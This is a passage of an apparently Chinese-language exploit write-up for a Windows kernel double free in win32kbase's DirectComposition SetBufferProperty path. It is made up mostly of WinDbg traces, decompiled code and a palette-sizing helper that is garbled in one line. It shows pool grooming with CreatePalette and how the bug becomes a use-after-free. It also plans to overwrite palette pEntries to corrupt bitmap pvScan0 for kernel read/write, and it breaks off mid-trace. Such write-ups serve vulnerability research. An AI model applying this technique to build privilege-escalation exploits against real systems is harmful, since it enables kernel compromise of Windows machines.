    win32kbase! ?? ::FNODOBFM::`string'+0x1d70d:
    ffff8aae`1923d4cd e89e39fbff      call    win32kbase!Win32AllocPoolWithQuota (ffff8aae`191f0e70)
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d712:
    ffff8aae`1923d4d2 48894758        mov     qword ptr [rdi+58h],rax
    kd> r rax
    rax=ffff8ace81fa9310
    kd> !pool ffff8ace81fa9310
    Pool page ffff8ace81fa9310 region is Paged session pool
    //******在SetBufferProperty中会在pool hole重新申请池空间
    *ffff8ace81fa9300 size:  100 previous size:   70  (Allocated) *DCdn Process: ffffa6018eb56080
            Pooltag DCdn : DCOMPOSITIONTAG_DEBUGINFO, Binary : win32kbase!DirectComposition::C
    //step 2
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d726:
    ffff8aae`1923d4e6 e849b30300      call    win32kbase!StringCbLengthW (ffff8aae`19278834)
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d72b:
    ffff8aae`1923d4eb 85c0            test    eax,eax
    //win32kbase!StringCbLengthW函数失败返回错误NTSTATUS
    kd> r eax
    eax=80070057
    //step 3
    //************这是第一次free
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d764:
    ffff8aae`1923d524 e8272af9ff      call    win32kbase!Win32FreePool (ffff8aae`191cff50)
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d769:
    ffff8aae`1923d529 90              nop
    kd> !pool ffff8ace81fa9310
    Pool page ffff8ace81fa9310 region is Paged session pool
    //**************free pool hole 
    *ffff8ace81fa9300 size:  100 previous size:   70  (Free ) *DCdn
            Pooltag DCdn : DCOMPOSITIONTAG_DEBUGINFO, Binary : win32kbase!DirectComposition::C
第二步，我们通过 CreatePalette 来申请 GDI kernel address 占用这个 hole，关于 palette
的占用大小，当时我为了做这个稳定的 pool fengshui，我跟了 CreatePalette
相关函数很长时间，做了很多尝试才发现如何控制申请的大小，不过最近有一篇 paper，给出了一个“公式”，这个大小和 struct LOGPALETTE
结构体成员有关，这里我就不重复逆向的繁琐过程了（）。
    HPALETTE createPaletteofSize(int size) {
      // we alloc a palette which will have the specific size on the paged session pool. 
      if (size palNumEntries = pal_cnt;
      lPalette->palVersion = 0x300;
      return CreatePalette(lPalette);
    }
我们通过 CreatePalette 可以申请和 hrescoure->databuf 相同大小空间的 pool，去占用这个 pool
hole，以便在下一步中 double free 掉这个 palette 对象。
    //createpalette创建palette占用pool hole
    kd> p
    win32u!NtGdiCreatePaletteInternal:
    0033:00007ffd`13ab25f0 4c8bd1          mov     r10,rcx
    kd> gu
    _dark_composition_+0x1b97:
    0033:00007ff6`25ca1b97 488b5d58        mov     rbx,qword ptr [rbp+58h]
    kd> !pool ffff8ace81fa9310
    Pool page ffff8ace81fa9310 region is Paged session pool
    //**************重新覆盖palette，这个palette会在第二次free时不知情的情况下free掉
    *ffff8ace81fa9300 size:  100 previous size:   70  (Allocated) *Gh08
            Pooltag Gh08 : GDITAG_HMGR_PAL_TYPE, Binary : win32k.sys
随后我们通过 Release Resource 会释放这个 palette kernel object（double free漏洞），这样又产生了一个
pool hole，而这个 palette 释放后，它的句柄仍然存在，我们仍然可以调用到这个句柄对 palette 进行操作。
    //Release Resource会释放掉palette
    kd> p
    _dark_composition_+0x1c08:
    0033:00007ff6`25ca1c08 41ffd5          call    r13
    kd> p
    _dark_composition_+0x1c0b:
    0033:00007ff6`25ca1c0b 488d153e2c0100  lea     rdx,[_dark_composition_+0x14850 (00007ff6`25cb4850)]
    kd> !pool ffff8ace81fa9310
    Pool page ffff8ace81fa9310 region is Paged session pool
    //*********palette在不知情的情况下被释放，double free变成use after free
    *ffff8ace81fa9300 size:  100 previous size:   70  (Free ) *Gh08
            Pooltag Gh08 : GDITAG_HMGR_PAL_TYPE, Binary : win32k.sys
接下来，我们需要用可控的内核对象来占用这个 hole，其实这种情况下，有很多内核对象可以用，但是我想到之前的 SetBufferProperty
就是为了将用户可定义的 databuf 拷贝到内核对象空间。也就是说，如果我们可以在 SetBufferProperty 函数创建池空间后不让它
free，也就是说 StringCbLengthW 能够成功返回，就可以不让它 free 了，而且可以通过 databuf 来控制内核空间的值。
    ffff8aae`1923d4e6 e849b30300      call    win32kbase!StringCbLengthW (ffff8aae`19278834)
    ffff8aae`1923d4eb 85c0            test    eax,eax
    ffff8aae`1923d4ed 782c            js      win32kbase! ?? ::FNODOBFM::`string'+0x1d75b (ffff8aae`1923d51b)
    //*************如果stringcblenghtw成功，则会进入拷贝逻辑
    ffff8aae`1923d4ef 488b5530        mov     rdx,qword ptr [rbp+30h]
    ffff8aae`1923d4f3 4c8bc6          mov     r8,rsi
    ffff8aae`1923d4f6 488b4f58        mov     rcx,qword ptr [rdi+58h]
    ffff8aae`1923d4fa 83476002        add     dword ptr [rdi+60h],2
    //************databuf拷贝
    ffff8aae`1923d4fe e8b5b20300      call    win32kbase!StringCbCopyW (ffff8aae`192787b8)
那么如何让 StringCbLengthW 函数成功呢？首先我们要分析为什么 StringCbLengthW 会返回错误。在 StringCbLength
有这样一处逻辑。
      do//v5是szBuf，v7是长度
      {
        if ( !*v5 )//若v5的值是0x00，则break跳出循环
          break;
        ++v5;//否则szBuf指针后移
        --v7;//计数器减1
      }
      while ( v7 );//若长度一直减到0
      if ( v7 )//若v7不为0
        v6 = v3 - v7;//正常返回
      else//若v7为0
    LABEL_16:
        v8 = -2147024809;//返回错误NTSTATUS
这样，我们只需要修改 databuf，增加一个\x00就可以不让 kernel object free 掉了，接下来我们需要考虑控制 palette
的内核空间，因为我们后面会直接用可控的 szBuf 对这个池空间进行覆盖，势必会覆盖到所有内容，如果 palette 的某些关键结构被覆盖，则会导致其他的
crash 的发生。
当然这里我们最主要控制的是 palette->pEntries，通过覆盖它就可以通过 SetPaletteEntries 来对 pEntries
指向的空间进行写入，而如果这个 pEntries 指向 ManagerBitmap 的 kernel object，我们就可以通过
SetPaletteEntries 修改 ManageBitmap 的 pvScan0，令它指向 WorkerBitmap 的 pvScan0。
由于我们要用到 SetPaletteEntries，所以我直接动态调试，并跟踪了这个函数。
    __int64 __fastcall GreSetPaletteEntries(HPALETTE a1, unsigned __int32 a2, unsigned __int32 a3, const struct tagPALETTEENTRY *a4)
    {
      v4 = a4;
      v5 = a3;
      v6 = a2;
      v7 = 0;
      EPALOBJ::EPALOBJ((EPALOBJ *)&v13, a1);
      v8 = v13;
      if ( v13 )
      {
        v14 = *(_QWORD *)ghsemPalette;
        GreAcquireSemaphore();
        v7 = XEPALOBJ::ulSetEntries((XEPALOBJ *)&v13, v6, v5, v4);
在跟踪的过程中，我找到了几处位置，在我通过 szBuf 覆盖的时候，需要注意这几处位置，不能随意修改其中的值，否则会导致 SetPaletteEntries
失败。
    //第一处是
    _QWORD *__fastcall EPALOBJ::EPALOBJ(_QWORD *a1, __int64 a2)
    {
      __int64 v2; // rax@1
      _QWORD *v3; // rbx@1
      __int64 v4; // rax@1
      *a1 = 0i64;
      v2 = a2;
      v3 = a1;
      LOBYTE(a2) = 8;
      LODWORD(v4) = HmgShareLockCheck(v2, a2);//这里会check句柄
      *v3 = v4;
      return v3;
    }
    //第二处是
        v7 = XEPALOBJ::ulSetEntries((XEPALOBJ *)&v13, v6, v5, v4);//检查+0x48 +0x50两个值
    //第三处是+0x28位置会有一个跳转
    kd> p
    win32kfull!GreSetPaletteEntries+0x72://check rbx+0x28  这个值是HDC，获取HDC的值，如果为0，则没有HDC，否则则有HDC，就可以绕过了，很简单，只需要申请一个hdc即可
    ffff915c`473f35f2 488b7b28        mov     rdi,qword ptr [rbx+28h]
    kd> r rdi
    rdi=ffff911680003000
    kd> p
    win32kfull!GreSetPaletteEntries+0x76:
    ffff915c`473f35f6 4885ff          test    rdi,rdi
    kd> r rdi
    rdi=ffff9116801cad00